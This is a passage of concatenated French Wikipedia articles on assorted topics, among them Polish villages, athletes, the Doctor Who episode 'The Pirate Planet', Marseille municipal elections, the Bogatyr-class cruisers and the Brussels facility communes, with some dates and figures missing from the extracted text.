Umiastów [uˈmjastuf] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 5 kilomètres au nord-ouest d'Ożarów Mazowiecki (chef-lieu) et à 17 kilomètres à l'ouest de Varsovie.
Le village a une population de 267 habitants en 2009.

</doc>
<doc id="7902069" url="https://fr.wikipedia.org/wiki?curid=7902069" title="Championnat de France masculin de handball de Nationale 2 2013-2014">
Championnat de France masculin de handball de Nationale 2 2013-2014

Le Championnat de France masculin de handball de Nationale 2 2013-2014 est la de ce championnat qui constitue le du handball français.
La compétition est remportée par le CO Vernouillet qui est promu en Nationale 1. Les autres promus et les relégués ne sont pas connus.
Les clubs de l'édition 2013-2014.
Poule 1
Poule 2
Poule 3
Poule 4
Poule 5
Poule 6

</doc>
<doc id="7902073" url="https://fr.wikipedia.org/wiki?curid=7902073" title="4e bataillon de tirailleurs">
4e bataillon de tirailleurs



</doc>
<doc id="7902074" url="https://fr.wikipedia.org/wiki?curid=7902074" title="Wieruchów">
Wieruchów

Wieruchów [vjɛˈruxuf] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 3 kilomètres au nord-est d'Ożarów Mazowiecki (chef-lieu) et à 13 kilomètres à l'ouest de Varsovie.
Le village a une population de 186 habitants en 2009.

</doc>
<doc id="7902076" url="https://fr.wikipedia.org/wiki?curid=7902076" title="Wolica (Varsovie-ouest)">
Wolica (Varsovie-ouest)

Wolica [vɔˈlit͡sa] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 8 kilomètres à l'ouest d'Ożarów Mazowiecki (chef-lieu) et à 22 kilomètres à l'ouest de Varsovie.

</doc>
<doc id="7902079" url="https://fr.wikipedia.org/wiki?curid=7902079" title="Wolskie">
Wolskie

Wolskie [ˈvɔlskʲɛ] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 6 kilomètres à l'ouest d'Ożarów Mazowiecki (chef-lieu) et à 20 kilomètres à l'ouest de Varsovie.
Le village a une population de 266 habitants en 2009.

</doc>
<doc id="7902081" url="https://fr.wikipedia.org/wiki?curid=7902081" title="Charles Inselin">
Charles Inselin

Charles Inselin, né le à Mangiennes et mort vers 1715, est un graveur français, plutôt spécialisé dans la géographie, les planches techniques (machines, etc.), le lettrage et la musique.
Biographie.
Charles Inselin s’est marié le en l’église Saint-Roch de Paris. L’acte cité par Henri Herluison ("Actes d’état-civil d'artistes français", Orléans, 1973, p. 188) n’indique pas le nom de l’épouse mais précise que le graveur était « âgé de 29 ans ».

</doc>
<doc id="7902082" url="https://fr.wikipedia.org/wiki?curid=7902082" title="Hamide Bıkçın">
Hamide Bıkçın

Hamide Bıkçın, née le , est une taekwondoïste turque. Elle a obtenu la médaille de bronze lors des Jeux olympiques d'été de 2000 dans la catégorie des moins de .
Elle a remporté plusieurs médailles mondiales et européennes : elle a gagné les Championnats du monde 1995 en moins de ainsi que les Championnats d'Europe en 1994 et 2000.

</doc>
<doc id="7902089" url="https://fr.wikipedia.org/wiki?curid=7902089" title="Mehdi Leroy">
Mehdi Leroy



</doc>
<doc id="7902097" url="https://fr.wikipedia.org/wiki?curid=7902097" title="Karin Stevens">
Karin Stevens

Karin Stevens est une joueuse de football néerlandaise, née à Maastricht (Pays-Bas), le . Elle a arrêté sa carrière en 2011.

</doc>
<doc id="7902100" url="https://fr.wikipedia.org/wiki?curid=7902100" title="Neuharlingersiel">
Neuharlingersiel

Neuharlingersiel est une commune allemande de l'arrondissement de Wittmund, Land de Basse-Saxe.
Géographie.
La commune se situe dans le Harlingerland, en Frise orientale, le long de la mer du Nord. La bande côtière fait partie du parc national de la Mer des Wadden de Basse-Saxe.
Elle comprend les quartiers d'Altharlingersiel, Neuharlingersiel, Ostbense et Seriem. Seriem se rapproche de Neuharlingersiel en 1968, les deux autres en 1972.
 
Depuis 1792, un service régulier est assuré dans le port de Neuharlingersiel pour rejoindre l'île de Spiekeroog.
Histoire.
Neuharlingersiel est mentionné pour la première fois en 1693. Son territoire est gagné grâce à une digue contre la tandis que celui de Altharlingersiel l'est par une écluse ("Siel" en allemand). Depuis ce temps, Neuharlingersiel est un port de pêche en haute mer.
Neuharlingersiel est classé station balnéaire depuis 1979.
Culture.
Le téléfilm pour enfants " est tourné en 2006.
La série de la ZDF " conserve le nom de la commune. La première saison est diffusée en , la seconde saison en .

</doc>
<doc id="7902102" url="https://fr.wikipedia.org/wiki?curid=7902102" title="Leptolalax botsfordi">
Leptolalax botsfordi

Leptolalax botsfordi est une espèce d'amphibiens de la famille des Megophryidae.
Répartition.
Cette espèce est endémique du parc national de Hoang Lien dans la province de Lào Cai au Viêt Nam. Elle se rencontre entre et d'altitude.

</doc>
<doc id="7902112" url="https://fr.wikipedia.org/wiki?curid=7902112" title="The Pirate Planet">
The Pirate Planet

 ("La Planète Pirate") est le quatre-vingt-dix-neuvième épisode de la première série de la série télévisée britannique de science-fiction "Doctor Who." Deuxième épisode de la seizième saison, il constitue le deuxième épisode de l'arc narratif de la "Clef du Temps" qui embrasse l'ensemble de la saison et fut originellement diffusé en quatre parties du au .
Accroche.
Le Docteur et Romana tentent de se rendre sur la planète Calufrax pour trouver le second segment de la Clef du Temps. Mais, ils arrivent sur Zanak, une planète qui a été transformée en gigantesque vaisseau spatial dirigé par un capitaine mystérieux que les habitants prennent pour un bienfaiteur.
Résumé.
Le Docteur et Romana sont guidés par le traceur jusqu'à Calufrax, une planète déserte et glacée. Pourtant, à leur destination, c'est une planète totalement différente et nommée Zanak, qu'ils découvrent : elle est habitable et les pierres les plus précieuses de la galaxie semblent y être totalement banales. Malgré la prospérité permanente des habitants, ceux-ci sont effrayés par la figure mystérieuse des Mentiads, des hommes pâles et encapuchonnés et semblent être en adoration envers le "Capitaine", le dirigeant de la planète.
Après avoir fait la connaissance de quelques habitants locaux, Kimus, Balaton et Pralix, qui semblent avoir été menacés par les Mentiads, le Docteur et Romana se retrouvent arrêtés par les gardes du capitaine. Après quelques péripéties, ils découvrent que la planète est entièrement creuse. Celle-ci se téléporte à différents points de l'univers englobant de nouvelles planètes afin de pomper l'intégralité de leurs ressources. Ils rencontrent les Mentiads, dont Kimus fait dorénavant partie. Il s'agit d'êtres ayant acquis des pouvoirs parapsychiques à chaque destruction de planète et issus de Zanak à l'époque où celle-ci était gouvernée par la reine Xanxia, une monarque qui a ruiné sa planète à force de guerres.
Alors que les Mentiads décident de marcher vers le pont de commandement du capitaine, le Docteur et Pralix se font de nouveau arrêter. Ils échappent de peu à la mort grâce à l'intervention de K-9 et découvrent que la Reine Xanxia est de nouveau vivante et commande le capitaine sous l'apparence de son infirmière. De plus, le Docteur découvre que le capitaine souhaite téléporter Zanak vers la Terre afin de voler son quartz, mais il comprend aussi que le capitaine possède un plan secret pour arrêter Xanxia se trouvant dans la salle des trophées du capitaine, et que la planète Calufrax était à elle seule, la deuxième partie de la clé du temps.
Alors qu'ils tentent de se dématérialiser autour de la Terre, le Docteur et Romana font de même avec leur TARDIS ce qui endommage le pont de commandement du capitaine. Les Mentiads réussissent à saboter les machines et Xanxia tue le capitaine alors qu'il tente de se rebeller. Peu de temps avant de récupérer la deuxième partie de la Clef, le Docteur, Romana et les Mentiads font sauter le pont de commandement, permettant à Zanak de redevenir une planète comme les autres.
Production.
Écriture.
Dès l'année 1976, le jeune scénariste Douglas Adams avait approché la production de Doctor Who afin de leur soumettre un scénario comique nommé "The Krikkitmen”. Malgré le refus, le script-éditor (responsable des scénarios) de l'époque, Robert Holmes avait trouvé le scénariste prometteur. Ce seront ses scénarios pour la version radiophonique du "The Hitchhiker's Guide to the Galaxy" en 1977 qui convaincront le nouveau script-éditor, Anthony Read à lui proposer d'écrire un épisode de la saison 16.
Le scénario initial proposé par Douglas Adams racontait l'histoire d'une planète minière des Seigneurs du Temps, dans laquelle le peuple était soumis à une machine destinée à les vider de toute agression et déguisée en statue. Un seigneur du temps devait se retrouver dans la statue et absorber toute l'agression contenue en elle, ce qui l'aurait poussé à attaquer Gallifrey en matérialisant une planète autour d'elle. Le producteur Graham Williams proposa de nombreux changements ainsi que l'addition de pirates de l'espace. L'intrigue secondaire autour de la statue inhibant l'agression fut abandonnée car jugée trop similaire à celle de « "The Sun Makers." » L'épisode fut commissionné le sous le titre de "The Pirates".
Jusqu'au mois d', l'épisode pris son nom définitif de "The Pirate Planet" et Adams y ajouta une voiture volante, afin d'abandonner les longs passages en couloirs qu'il trouvait ennuyeux. Il eut aussi l'idée du Capitaine et de son perroquet robot. L'écriture de l'épisode fut ralentie car Adams était occupé à écrire de nouveaux épisodes du "Guide du routard galactique" ainsi que des épisodes de "Week Ending" sur Radio 4. À cette époque, Read constate que le scénario est bien trop complexe et bien trop coûteux pour la télévision. Il fut même question d'abandonner l'épisode, le chef du département des fictions de la BBC, Graeme McDonald ayant demandé que la série devienne moins comique. Graham Williams défendra néanmoins le projet, estimant que l'humour permettait à la série d'être moins horrifique.
L'épisode fut modifié de nouveau au début de 1978, six semaines avant son entrée en production. Alors chargé de la production (Graham Williams s'étant cassé une jambe), Anthony Read trouve appui auprès du réalisateur Pennant Roberts afin d'inclure quelques éléments de la quête de la clé du temps à l'intérieur de l'histoire, Calufrax devenant sa deuxième partie.
Tournage.
Le réalisateur engagé pour cet épisode fut Pennant Roberts qui avait tourné « "The Sun Makers" » durant la saison précédente.
Le tournage hors-studio débuta le à la centrale nucléaire de Berkeley dans le Gloucestershire afin de tourner les scènes se déroulant dans la salle des machines. Les jours suivants furent passés à tourner des plans en extérieur dans le Gwent. Les scènes sur les versants des montagnes de Zanak furent filmées près des tunnels ferroviaires de Clydach à Daren-Felen, les 3 et . Le fut réservé au tournage des scènes se déroulant dans les tunnels à l'intérieur de la montagne, filmées dans les cavernes d'Abercrave, dans le Swansea.
Le tournage en studio débuta par une première session les 22 et au studio 6 du Centre télévisuel de la BBC par l'enregistrement des scènes se déroulant dans les rues de la ville, à la maison de Balaton, dans la salles des Mentiads et dans la voiture volante. La seconde session eut lieu du 3 au et fut ralentie par des disputes au sein de l'équipe de tournage, choses qui se passaient couramment depuis le tournage de « "The Invasion of Time." » Les deux premiers jours furent passés à tourner les scènes sur le pont de commandement du vaisseau, dans la salle des Mentiads, dans les couloirs ainsi que dans l'entrée de la salle des machines. Le , les scènes se déroulant dans le TARDIS, dans la chambre de Xanxia et dans la salle des trophées. Une scène où le Docteur se cogne au TARDIS en début d'épisode fut tournée afin d'expliquer la raison de la cicatrice sur le visage de Tom Baker.
Au cours du tournage, l'accessoire permettant de simuler l'Avitron fut volé, puis redécouvert caché dans les studios le lendemain matin, permettant de finir le tournage de la bataille entre K-9 et l'oiseau volant.
Diffusion et Réception.
Critiques.
En 1995 dans le livre « "Doctor Who : The Discontinuity Guide" », Paul Cornell, Martin Day, et Keith Topping trouvent l'histoire inventive et estime que l'épisode a maturé pour devenir une alchimie entre l'intelligence et la stupidité. Les auteurs de « "Doctor Who : The Television Companion" » (1998) décrivent l'épisode comme "appréciable" en particulier à cause du jeu de Tom Baker et Mary Tamm ainsi que des acteurs dépeignant le Capitaine et Mr Fibuli. Toutefois, ils trouvent que le reste des personnages secondaires est "simplement atroce."
En 2011, Mark Braxton de "Radio Times" trouve quelques erreurs dans le scénario et déplore le manque de budget qui n'a pas permis à l'épisode d'aller jusqu'au bout de ses idées, mais il apprécie les jeux d'acteurs ainsi que la tonalité amusante de l'épisode. Justin Felix du site "DVD Talk" donne à l'épisode la note de 3,5 sur 5, décrivant l'histoire comme "assez intelligente" et "amusante" mais trouve que le jeu trop exagéré des acteurs l'affaibli. En 2010, Charlie Jane Anders du site io9 listera le cliffhanger de la fin de la troisième partie dans sa liste des meilleurs cliffhanger de l'histoire de la série.
Novélisation.
Contrairement à l'habitude, cet épisode, comme ceux écrit par Douglas Adams ne fut jamais adapté en roman, car celui-ci voulait le faire lui-même et il n'eut pas le temps avant sa disparition en 2001. Toutefois, en 1990, une novélisation non officielle a vu le jour en Nouvelle-Zélande.
Éditions commerciales.
L'épisode n'a jamais été édité en français, mais a connu plusieurs éditions au Royaume-Uni et dans les pays anglophones.

</doc>
<doc id="7902125" url="https://fr.wikipedia.org/wiki?curid=7902125" title="USS Cyclops (AC-4)">
USS Cyclops (AC-4)

LUSS "Cyclops" (AC-4) est l'un des quatre charbonniers de la classe Proteus construit pour la Marine américaine en 1910. Son nom fait référence aux Cyclopes, des géants de la mythologie grecque (il s'agit du deuxième navire de la marine américaine à porter ce nom).
Histoire.
En 1918, la perte du bateau et de ses 306 membres d'équipage et passagers dans la mer des Antilles, sans laisser de traces, reste la plus grande disparition de l'histoire de la marine américaine hors affrontements. Étant donné que le drame se déroula pendant la Première Guerre mondiale, des spéculations ont existé sur le fait que le navire aurait été capturé ou coulé par un sous-marin allemand (il transportait en effet de minerai de manganèse, utilisé pour produire des munitions). Les autorités allemandes de l'époque ont nié avoir un lien quelconque avec cet événement et le commandement de la marine américaine a conclu que le bateau avait probablement coulé lors d'une tempête pour une cause inconnue.

</doc>
<doc id="7902127" url="https://fr.wikipedia.org/wiki?curid=7902127" title="Satya Oblet">
Satya Oblet



</doc>
<doc id="7902129" url="https://fr.wikipedia.org/wiki?curid=7902129" title="Élections municipales de 1977 à Marseille">
Élections municipales de 1977 à Marseille

Des élections municipales ont lieu à Marseille les 13 et . 
Gaston Defferre, maire socialiste depuis 1953, est réélu pour un cinquième mandat.
Mode de scrutin.
Depuis 1965, les conseillers municipaux au scrutin de liste majoritaire dans le cadre de huit secteurs : la liste gagnante remporte la totalité des sièges du secteur. Pour l'emporter, une liste doit recueillir la majorité absolue des suffrages exprimés au premier tour ou la majorité relative au second.

</doc>
<doc id="7902135" url="https://fr.wikipedia.org/wiki?curid=7902135" title="Gutehoffnungshütte">
Gutehoffnungshütte

Gutehoffnungshütte (GHH) était une entreprise allemande d'ingénierie minière, localisée à Oberhausen dans la région de la Ruhr.
Dans les années 1960, il a coopéré avec la Roumanie pour la mise en oeuvre du projet de site sidérurgique géant, le combinat de Galati.

</doc>
<doc id="7902136" url="https://fr.wikipedia.org/wiki?curid=7902136" title="Université Oberlin">
Université Oberlin

L' est une université privée japonaise située à Machida, dans la préfecture de Tokyo. Son nom se réfère aussi bien au français Jean-Frédéric Oberlin qu'à l'Oberlin College situé dans l'Ohio, où Yasuzo Shimizu, le fondateur de l'Université Oberlin, a été étudiant.

</doc>
<doc id="7902140" url="https://fr.wikipedia.org/wiki?curid=7902140" title="Château de Nointel (Val-d’Oise)">
Château de Nointel (Val-d’Oise)



</doc>
<doc id="7902146" url="https://fr.wikipedia.org/wiki?curid=7902146" title="Leptolalax fritinniens">
Leptolalax fritinniens

Leptolalax fritinniens est une espèce d'amphibiens de la famille des "Megophryidae".
Répartition.
Cette espèce est endémique de Bornéo. Elle se rencontre :

</doc>
<doc id="7902147" url="https://fr.wikipedia.org/wiki?curid=7902147" title="Eberhard Hoesch">
Eberhard Hoesch

Eberhard Hoesch peut faire référence à :

</doc>
<doc id="7902149" url="https://fr.wikipedia.org/wiki?curid=7902149" title="Kallang">
Kallang

Kallang est une subdivision urbaine de la ville de Singapour, surtout connue pour le Singapore Indoor Stadium, d'une capacité de , où se déroulent des compétitions sportives et des concerts ou autres évènements.
Elle est traversée par la Kallang River qui s'écoule du Lower Pierce Reservoir.
La Marina Coastal Expressway (MCE) passe en tunnel sous Kallang.

</doc>
<doc id="7902152" url="https://fr.wikipedia.org/wiki?curid=7902152" title="Jessy Torreele">
Jessy Torreele

Jessy Torreele est une joueuse de football belge, née le à Louvain (Belgique). 

</doc>
<doc id="7902153" url="https://fr.wikipedia.org/wiki?curid=7902153" title="Élections municipales de 1983 à Marseille">
Élections municipales de 1983 à Marseille

Les élections municipales de 1983 à Marseille sont les élections municipales qui ont eu lieu à Marseille les 6 et .
Gaston Defferre, maire socialiste depuis 1953, est réélu pour un sixième et dernier mandat, tout en ayant sur la ville près de de moins que la droite : il meurt trois ans plus tard, en 1986.
Mode de scrutin.
La loi PLM a changé le mode de scrutin par rapport aux dernières élections : les élections se déroulent désormais par secteur, regroupant chacun un à trois arrondissements.
Chaque secteur élit ses conseillers (303 au total), dont un tiers siègent au conseil municipal (101), selon la même procédure que dans les communes de plus de. Les premiers élus de chaque liste siègent également au conseil municipal, les suivants seulement au conseil de secteur. Lors de sa première séance, chaque conseil de secteur élit son maire de secteur.
Dans chaque secteur, la liste arrivée en tête obtient la moitié des sièges. Le reste est réparti à la proportionnelle entre toutes les listes ayant obtenu au moins 5 % des voix. Un deuxième tour est organisé si aucune liste n'atteint les 50 % au premier tour, seules les listes ayant obtenu aux moins 10 % peuvent s'y présenter.
Résultats.
Gaston Defferre, maire socialiste depuis 1953, est réélu pour un sixième et dernier mandat, tout en ayant sur la ville près de de moins que la droite : il meurt trois ans plus tard, en 1986.

</doc>
<doc id="7902156" url="https://fr.wikipedia.org/wiki?curid=7902156" title="Les Gardiens de la Galaxie">
Les Gardiens de la Galaxie



</doc>
<doc id="7902166" url="https://fr.wikipedia.org/wiki?curid=7902166" title="Jan Willem Snippe">
Jan Willem Snippe

Jan Willem Snippe est un joueur néerlandais de volley-ball né le à Heemskerk (Hollande-Septentrionale). Il mesure et joue réceptionneur-attaquant. Il totalise 103 sélections en équipe des Pays-Bas.

</doc>
<doc id="7902172" url="https://fr.wikipedia.org/wiki?curid=7902172" title="Élections municipales de 1989 à Marseille">
Élections municipales de 1989 à Marseille

Des élections municipales de 1989 à Marseille ont lieu les 12 et . 
Robert Vigouroux, qui a remplacé Gaston Defferre après son décès en 1986, se présente pour un nouveau mandat. Il ne reçoit cependant pas l'investiture du Parti socialiste, qui revient à Michel Pezet. Jean-Claude Gaudin se présente à la tête d'une alliance UDF-RPR.
Robert Vigouroux est largement réélu, remportant l'ensemble des huit secteurs de la ville.
Mode de scrutin.
Conformément à la loi PML, les élections se déroulent par secteur mais ceux-ci ont été redécoupés par rapport aux élections précédentes et regroupent désormais chacun deux arrondissements. 
Chaque secteur élit ses conseillers (303 au total), dont un tiers siègent au conseil municipal (101), selon la même procédure que dans les communes de plus de. Les premiers élus de chaque liste siègent également au conseil municipal, les suivants seulement au conseil de secteur. Lors de sa première séance, chaque conseil de secteur élit son maire de secteur.
Dans chaque secteur, la liste arrivée en tête obtient la moitié des sièges. Le reste est réparti à la proportionnelle entre toutes les listes ayant obtenu au moins 5 % des voix. Un deuxième tour est organisé si aucune liste n'atteint les 50 % au premier tour, seules les listes ayant obtenu aux moins 10 % peuvent s'y présenter.

</doc>
<doc id="7902180" url="https://fr.wikipedia.org/wiki?curid=7902180" title="Château Ehrenberg">
Château Ehrenberg

Les ruines du se trouvent à d'altitude au sud de Reutte, une municipalité du land du Tyrol en Autriche.
La ruine est le centre de l'un des ensembles fortifiés les plus importants d'Europe centrale. Le château est dominé par la , une forteresse baroque, qui verrouille l'accès à la vallée. Cet ensemble de fortification est complété à l'est par le .
Depuis 2014, la , une passerelle, suspendue à plus de au dessus de la vallée, de de long, joint les deux sites.

</doc>
<doc id="7902181" url="https://fr.wikipedia.org/wiki?curid=7902181" title="Snégurochka">
Snégurochka



</doc>
<doc id="7902184" url="https://fr.wikipedia.org/wiki?curid=7902184" title="Université Tōhoku gakuin">
Université Tōhoku gakuin

L' est une université privée japonaise dont le campus est situé à Sendai, dans la préfecture de Miyagi.

</doc>
<doc id="7902191" url="https://fr.wikipedia.org/wiki?curid=7902191" title="Emmanuel Michalak">
Emmanuel Michalak

Emmanuel Michalak, né le à Épernay, est un illustrateur de jeux de rôle et un dessinateur de BD français.
Biographie.
Après son baccalauréat, il intègre l'école des beaux-arts de Reims, où il a pour condisciple Laurent Cagniat, et pour professeur le sculpteur Charles Auffret. Il se met à la BD en 1994.
Jeux de rôle.
En 1998, il aborde l'illustration de jeux de rôle. Il débute dans un supplément d’"Hawkmoon", pour les éditions Oriflam. Il travaille ensuite sur Polaris, dans les suppléments Gaïa et Surface. Il produit divers scénarios pour le magazine "Backstab", et illustre Nephilim pour les Chroniques de l'apocalypse. Son dessin est alors très proche de celui de ses BD.
Dans "Voir Charousse et mourir", supplément de "7th Sea (Les Secrets de la septième mer)", il finalise pour la première fois au crayon, et prend goût à l'illustration des jeux de rôle. Il produit beaucoup, de septembre 2000 à juin 2001.
Bande dessinée.
En parallèle, son démarchage d'éditeurs de bande dessinée se révèle infructueux. Fin 1999, il rencontre le scénariste BD Michaël Le Galli. Ensemble, ils élaborent la série "Les Cercles d'Akamoth" (quatre albums), un polar fantastique dénonçant les dérives sectaires et, en juin 2001, ils signent un contrat chez l'éditeur Delcourt. "Les Sans-Âme", premier album de la série, paraît en mai 2003. Le Galli et Michalak poursuivent leur collaboration avec un polar géopolitique, la série "Watch" (six albums), dont Michalak dessine le "storyboard". "Bombes humaines", premier album de la série, paraît en 2006 chez Delcourt.
En 2007, Michalak entame une collaboration avec le scénariste et dessinateur Hub. Ils réalisent ensemble le "storyboard" des albums 3 à 8 de la série "Okko". De 2011 à 2013, sur un scénario d'Hub et de Fred Weytens, Michalak dessine la série d'heroic fantasy "Aslak", qui se situe dans l'univers des Vikings. Le premier album, "L'Œil du monde", paraît en 2011 chez Delcourt.
En 2023 sort chez Delcourt son "Tous ensemble" : scénarisée par Kris, l'histoire dessinée par Michalak conte une comédie sociale, avec l'aventure d'un supporter du Stade Brestois et ses comparses qui vont tenter de sauver leur club de foot préféré en proie autant à des difficultés financières insurmontables qu'à un parcours hors norme en Coupe de France

</doc>
<doc id="7902197" url="https://fr.wikipedia.org/wiki?curid=7902197" title="Fucking (homonymie)">
Fucking (homonymie)



</doc>
<doc id="7902207" url="https://fr.wikipedia.org/wiki?curid=7902207" title="Romana Hejdová">
Romana Hejdová

Romana Hejdová, née le à Brno (Tchéquie), est une joueuse professionnelle tchèque de basket-ball.
Biographie.
En 2008, elle participe aux Jeux olympiques.
Pour 2013-2014, elle rejoint le club promu en LFB d'Angers pour sa première expérience à l'étranger. Après deux saisons réussies dans l'Anjou (10,7 points, 2,8 rebonds et 2,3 passes décisives pour 9,5 d'évaluation en 29 minutes en 2014-2015), elle signe mi-2015 pour Tarbes. Mais à la suite de la relégation financière en LF2 de Tarbes, elle joue finalement dans l'équipe repêchée de Hainaut. Pour sa seconde saison au Hainaut, elle inscrit 26 points en novembre 2016 lors de la victoire 71 à 56 sur Angers.
Romana Hejdová rejoint le club de Basket Landes pour la saison 2018-2019 de la LFB et signe en pour une seconde saison. Ana Dabović indisponible en début de la saison LFB 2021-2021, elle rejoint Montpellier, mais elle quitte le club dès décembre avec des statistiques faibles (5,3 points par match, 4 rebonds, 1,0 passe décisive) pour rejoindre Nantes Rezé.

</doc>
<doc id="7902208" url="https://fr.wikipedia.org/wiki?curid=7902208" title="Christian Bonnet (réalisateur)">
Christian Bonnet (réalisateur)

Christian Bonnet est un réalisateur français de télévision.

</doc>
<doc id="7902209" url="https://fr.wikipedia.org/wiki?curid=7902209" title="Romana Hejdova">
Romana Hejdova



</doc>
<doc id="7902220" url="https://fr.wikipedia.org/wiki?curid=7902220" title="Classe Bogatyr">
Classe Bogatyr

La classe Bogatyr est une classe de quatre croiseurs protégés construits pour la Marine impériale de Russie au début du . Deux rejoignent la flotte de la Baltique et les deux autres la flotte de la mer Noire. Ils connaissent des fortunes diverses, participant à la bataille de Tsushima ou à la guerre civile russe ; certains sont coulés durant ces conflits, d'autres intègrent par la suite la flotte de l'Armée blanche ou la marine soviétique. 
Conception.
Lors de son lancement, la classe Bogatyr est considérée comme une réussite, mais elle est dépassée lorsque la Première Guerre mondiale débute. Les croiseurs protégés de la classe possèdent trois cheminées et disposent d'un gaillard d'avant et d'une poupe relativement courts. Les canons de sont disposés de la manière suivante : une tourelle double à l'avant, une autre à l'arrière et huit casemate simples réparties de chaque côté du navire. Les canons de sont quant à eux répartis sur le pont supérieur. Le blindage du pont varie de à au niveau au-dessus de la salle machine. Les tourelles bénéficient d'un blindage de à ( au niveau du toit) et les casemates d'une couche allant de à selon les endroits. De manière générale, les croiseurs de la classe Bogatyr sont mieux protégés que leurs prédécesseurs.
Histoire.
Le "Bogatyr" et l"Oleg" rejoignent la flotte de la Baltique dès leur mise en service. Lorsque les tensions avec l'empire du Japon se font sentir, les deux navires sont transférés en Extrême-Orient et basés à Vladivostok. Ils participent alors à la guerre russo-japonaise : le "Bogatyr" passe celle-ci en réparations à Vladivostok après s'être échoué dans la baie de l'Amour, alors que l"Oleg" participe à la bataille de Tsushima. Celui-ci réussit à échapper après la défaite, et rejoint les Philippines où il est interné par la marine américaine le ; il est rendu à la Russie à la fin de la guerre. Les deux navires réintègrent alors la flotte de la Baltique et participent à la Première Guerre mondiale au sein de la première brigade de croiseurs. En 1916 ils sont réarmés et se voient installer des dispositifs de mouillage de mines. En août 1917 les deux navires rejoignent le camp des bolcheviques, et l"Oleg" participe activement à la révolution d'Octobre, rejoignant la toute jeune marine soviétique en 1919. Il est finalement coulé le par le patrouilleur britannique "CMB-4". Le "Bogatyr" quant à lui est vendu pour démolition en 1922.
L"Otchakov" entre en service le à Sébastopol alors qu'il n'est pas entièrement terminé. Trois jours plus tard, une mutinerie éclate à son bord ainsi que sur 6 autres navires. Le croiseur est alors pilonné par l'artillerie des cuirassés restés fidèles aux autorités, et la mutinerie est réprimée. Afin de passer à autre chose, le navire est renommé "Kagoul" le , et le navire jusqu'alors nommé ainsi est renommé "Pamiat Merkouria". Les deux sister-ships rejoignent alors la flotte de la mer Noire. Entre 1913 et 1916 les deux croiseurs reçoivent différentes modifications au niveau de l'armement. Le , après la révolution de Février, le "Kagoul" retrouve son nom d"Otchakov". Dès avril, les deux navires arborent les couleurs de la marine de la jeune République populaire ukrainienne avant d'être capturés par les Allemands à Sébastopol. En novembre 1918 ils sont rendus aux Alliés et rejoignent la flotte de l'Armée blanche. L"Otchakov" et est alors renommé "Général Kornilov". Interné par les Français à Bizerte le , il est rendu aux Soviétiques en 1924 avant d'être finalement démoli en 1933. Le "Pamiat Merkouria" est quant à lui recapturé par les Soviétiques en novembre 1920, renommé "Komintern" et mis en service dans la marine soviétique le . Complètement remis à neuf en 1932, il est expérimenté comme transport d'hydravions de 1936 à 1937. Converti en navire-école en 1939, il participe à la défense de Sébastopol en 1942 avant d'être endommagé par des bombardiers allemands à Novorossiïsk puis à Poti. il est alors retiré du service, désarmé, et coulé comme brise-lames dans l'estuaire de la . Il est finalement renfloué en 1958 afin d'être démoli.

</doc>
<doc id="7902225" url="https://fr.wikipedia.org/wiki?curid=7902225" title="Liste de jeux Atari Games">
Liste de jeux Atari Games

La liste de jeux Atari Games répertorie les jeux d’arcade, ainsi que les jeux vidéo d'arcade produits par "Atari Games". Ces jeux ont été manufacturés de 1984 à 2001. Les productions de jeux vidéo pour console de salon et pour ordinateur personnel sont estampillées « Tengen » et « Time Warner Interactive ».

</doc>
<doc id="7902232" url="https://fr.wikipedia.org/wiki?curid=7902232" title="Communes à facilités de la périphérie bruxelloise">
Communes à facilités de la périphérie bruxelloise

Les communes à facilités de la périphérie bruxelloise sont les six communes à facilités linguistiques situées en Brabant flamand à proximité de la Région de Bruxelles-Capitale. Ces communes, à savoir Kraainem, Drogenbos, Linkebeek, Rhode-Saint-Genèse, Wemmel et Wezembeek-Oppem, bénéficient de facilités linguistiques qui permettent à leurs habitants francophones de pouvoir utiliser le français lors de leurs communications avec l'administration communale, entre autres. Ces communes représentent un peu plus de en 2014. L'avenir institutionnel de ces communes est au centre des débats communautaires, leurs populations étant désormais majoritairement francophones.
Évolution démographique et linguistique.
Tout comme les communes de l'actuelle Région de Bruxelles-Capitale, les communes périphériques autour de la capitale semblaient systématiquement se franciser à la suite d'une expansion démographique et d'un processus d'urbanisation. Selon les résultats du dernier recensement linguistique de 1947, qui doivent cependant être employés avec beaucoup de prudence, l'ensemble des six communes comprenait à cette époque entre 15 et 27 % de francophones unilingues, mais un tiers de la population déclarait parler "le plus fréquemment" la langue française. Depuis lors, la proportion des francophones a évolué jusqu'à faire d'eux une majorité.
Évolution institutionnelle.
Frontière linguistique et facilités.
Lors de la fixation de la frontière linguistique a été négociée la constitution d'un arrondissement judiciaire et administratif du nom de BHV qui a pris fin dans les années 2010. En complémentarité avec la création de cet arrondissement avait été décidée la création d'un régime dit de "facilités linguistiques" pour les 6 communes de la périphérie bruxelloise.
Évolutions récentes.
Circulaires flamandes.
La circulaire Peeters de 1997 a réglementé les conditions d'utilisation du français sur le plan administratif et électoral.
Création du canton électoral de Rhode-Saint-Genèse.
Depuis la réforme institutionnelle de 2012, les habitants de ces six communes ont le choix de pouvoir voter aux élections législatives soit pour des listes de Hal-Vilvorde, soit pour des listes bruxelloises. Ce choix n'a cependant pas de conséquences sur le nombre de sièges dévolus à chaque circonscription électorale (en 2014, 15 sièges sont à pourvoir pour Bruxelles et 15 pour le Brabant flamand).

</doc>
<doc id="7902241" url="https://fr.wikipedia.org/wiki?curid=7902241" title="Antun Pogacnik">
Antun Pogacnik



</doc>
<doc id="7902243" url="https://fr.wikipedia.org/wiki?curid=7902243" title="Ville participative">
Ville participative



</doc>
<doc id="7902246" url="https://fr.wikipedia.org/wiki?curid=7902246" title="Corinne Charbonnel">
Corinne Charbonnel

